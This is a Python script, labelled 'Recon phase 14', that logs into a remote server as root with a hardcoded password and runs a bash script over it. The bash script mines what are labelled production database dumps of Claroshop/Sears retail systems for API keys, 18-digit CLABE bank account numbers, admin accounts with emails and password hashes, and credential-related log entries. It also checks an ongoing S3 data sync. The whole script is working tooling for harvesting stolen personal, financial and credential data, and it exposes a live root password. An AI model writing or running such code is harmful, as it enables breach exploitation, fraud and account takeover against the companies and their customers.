"""Recon phase 14: API keys in request logs, CLABE patterns, admin users."""
import paramiko

HOST = "157.180.98.220"
USER = "root"
PASS = "?hK7L3jH76vRT7"

REMOTE_SCRIPT = r'''
#!/bin/bash
APP=/storage/claroshop_dump/mysql_prod/app_sears10_2026_08_23.sql
TIENDA=/storage/claroshop_dump/mysql_prod/tienda_2026.sql

echo "=== app_cron_api_claroshop_requests sample (API keys in URIs?) ==="
grep -m1 'INSERT INTO `app_cron_api_claroshop_requests`' "$APP" | head -c 1500
echo ""
echo ""

echo "=== CLABE pattern (18 digits) in app_sears10 ==="
grep -m5 -oP "'\d{18}'" "$APP" | head -5
echo ""

echo "=== CLABE pattern in tienda ==="
grep -m5 -oP "'\d{18}'" "$TIENDA" | head -5
echo ""

echo "=== Admin/SuperAdmin users (perfil 1-2) with emails ==="
grep -m1 'INSERT INTO `usuarios`' "$APP" | grep -oP "\([0-9]+,'[^']*','[^']*','[^']*',[0-9],'[^']*@[^']*','[a-f0-9]{32}',[12]," | head -25
echo ""

echo "=== sears.com.mx / claroshop.com / sanborns email count in usuarios ==="
grep -m1 'INSERT INTO `usuarios`' "$APP" | grep -oP "'[a-zA-Z0-9._%+-]+@(sears\.com\.mx|claroshop\.com|sanborns\.com\.mx|iliux\.com)" | wc -l
echo ""

echo "=== logs: password/credential related entries ==="
grep -m3 -o ".\{0,80\}contrase[^']\{0,80\}" "$APP" | head -5
echo ""

echo "=== sync progress now ==="
tail -3 /storage/claroshop_dump/s3_sync.log
du -sh /storage/claroshop_dump/s3/ 2>/dev/null
'''

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST, username=USER, password=PASS, timeout=30)

sftp = c.open_sftp()
with sftp.file("/tmp/recon14.sh", "w") as f:
    f.write(REMOTE_SCRIPT)
sftp.close()

stdin, stdout, stderr = c.exec_command("bash /tmp/recon14.sh", timeout=1800)
out = stdout.read().decode("utf-8", errors="replace")
err = stderr.read().decode("utf-8", errors="replace")
import sys
sys.stdout.buffer.write(out.encode("utf-8", errors="replace"))
if err:
    sys.stdout.buffer.write(("\n--- STDERR ---\n" + err).encode("utf-8", errors="replace"))
sys.stdout.buffer.write(b"\n")
c.close()
